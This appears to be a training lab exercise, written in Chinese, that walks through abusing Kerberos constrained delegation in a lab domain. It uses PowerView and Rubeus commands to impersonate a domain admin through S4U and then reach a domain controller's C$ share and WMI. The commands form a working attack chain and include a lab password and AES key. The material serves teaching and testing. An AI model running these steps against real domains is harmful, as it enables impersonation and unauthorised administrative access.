# Exercise 5 - Kerberos Classic Delegation

## Tools

所需工具:

- PowerView: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
- Rubeus: [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

## Exercise

在本練習中，我們將嘗試利用taskservice的委派權限偽冒任意使用者存取ad-01

首先我們先載入所需模組(Powerview.ps1、Invoke-Rubeus.ps1)

```powershell
cd C:\attacker-tools
cat -raw .\PowerView.ps1 | iex
cat -raw .\Invoke-Rubeus.ps1 | iex
```

列舉具有委派權限的Domain user

```powershell
Get-DomainUser -TrustedToAuth
```

查看具委派權限的Domain user是具有哪些服務的委派權限

```powershell
Get-DomainUser -TrustedToAuth | select -ExpandProperty msds-allowedtodelegateto
```

經查看domain user `taskservice`具有三個服務的委派權限，且我們具有taskservice的明文密碼。
可利用明文密碼產生後續要發起S4U2SELF請求的AES KEY

```powershell
Invoke-Rubeus -Command "hash /password:Amsterdam2015 /domain:contoso.com /user:taskservice"
```

以下指令可另外開啟一個powershell session，可不影響目前使用者(john)的kerberos ticket。

```powershell
Invoke-Rubeus -Command "createnetonly /program:C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe /show"
```

首先我們利用 S4U2SELF偽冒domain admin user `Bruce Willis` (bwillis)並使用S4U2PROXY分別取得AD-01上的CIFS、HOST和RPCSS的Service Ticket，
這三個SPN分別為以下服務:
- CIFS : SMB
- HOST、RPCSS : WMI


```powershell
Invoke-Rubeus -Command "s4u /user:taskservice /aes256:390F5466C4FCCB8A04955838C3890D067050B3035886ED97D8D96912E8E70C01 /impersonateuser:bwillis /msdsspn:cifs/ad-01.contoso.com /ptt"
Invoke-Rubeus -Command "s4u /user:taskservice /aes256:390F5466C4FCCB8A04955838C3890D067050B3035886ED97D8D96912E8E70C01 /impersonateuser:bwillis /msdsspn:host/ad-01.contoso.com /ptt"
Invoke-Rubeus -Command "s4u /user:taskservice /aes256:390F5466C4FCCB8A04955838C3890D067050B3035886ED97D8D96912E8E70C01 /impersonateuser:bwillis /msdsspn:rpcss/ad-01.contoso.com /ptt"
```

列舉目前取得的kerberos ticket

```powershell
klist
```

嘗試存取ad-01的SMB服務

```powershell
ls \\ad-01.contoso.com\C$
```

嘗試利用ad-01的WMI服務列舉該電腦所有的Process

```powershell
Get-WmiObject -Class win32_process -ComputerName ad-01.contoso.com
```